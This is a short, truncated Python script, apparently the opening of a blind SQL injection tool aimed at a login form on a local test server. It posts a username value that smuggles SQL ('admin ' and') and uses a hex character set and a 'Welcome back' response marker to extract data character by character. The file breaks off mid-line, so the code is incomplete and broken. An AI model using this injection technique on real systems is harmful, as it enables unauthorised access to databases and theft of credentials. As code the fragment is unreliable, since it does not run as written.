#!/usr/bin/env python3
#Author: Bill Burn

import click
import requests
click.clear()

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data = {"username" : "admin ' and})